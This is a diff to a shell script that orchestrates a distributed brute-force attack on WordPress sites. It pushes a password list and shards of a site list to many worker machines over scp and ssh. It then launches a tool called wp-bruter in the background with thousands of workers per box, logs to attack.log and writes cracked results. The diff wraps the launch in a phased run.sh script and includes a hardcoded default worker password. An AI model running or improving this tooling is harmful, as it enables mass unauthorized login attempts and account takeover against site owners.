@@ -13,6 +13,7 @@ WORKER_PASS="${WORKER_PASS:-fahrel}"
 WORKERS_PER_BOX="${WORKERS_PER_BOX:-4000}"
 ACTIVE_PER_BOX="${ACTIVE_PER_BOX:-8000}"
 PREP_PER_BOX="${PREP_PER_BOX:-256}"
+PHASES="${PHASES:-150 500 0}"
 SITES_FILE="${SITES_FILE:-/root/wordpress.txt}"
 LOCAL_SITES="${LOCAL_SITES:-wordpress.txt}"
 WORKERS=(
@@ -64,6 +65,7 @@ for WORKER in "${WORKERS[@]}"; do
             sleep 1
         done
         scp_cmd pass.txt "$WORKER" /opt/wp-bruter/pass.txt 2>/dev/null
+        scp_cmd run.sh "$WORKER" /opt/wp-bruter/run.sh 2>/dev/null
         scp_cmd "$SHARD" "$WORKER" "/root/wordpress.s$idx" 2>/dev/null
 
         ssh_cmd "$WORKER" "
@@ -78,16 +80,12 @@ for WORKER in "${WORKERS[@]}"; do
             mkdir -p /opt/wp-bruter
             echo '' > /opt/wp-bruter/debug.log
             cd /opt/wp-bruter
-            nohup ./wp-bruter \
-                -sites /root/wordpress.s$idx \
-                -passlist pass.txt \
-                -output results.txt \
-                -max-workers $WORKERS_PER_BOX \
-                -max-active-sites $ACTIVE_PER_BOX \
-                -prep-workers $PREP_PER_BOX \
-                -timeout 5 \
-                -verbose \
-                >> attack.log 2>&1 &
+            chmod +x run.sh
+            PHASES="$PHASES" \
+            WORKERS_PER_BOX=$WORKERS_PER_BOX \
+            ACTIVE_PER_BOX=$ACTIVE_PER_BOX \
+            PREP_PER_BOX=$PREP_PER_BOX \
+            nohup ./run.sh $idx >> attack.log 2>&1 &
             sleep 2
             pgrep -f wp-bruter > /dev/null && echo '  ✅ Running' || echo '  ❌ Failed'
         " 2>/dev/null
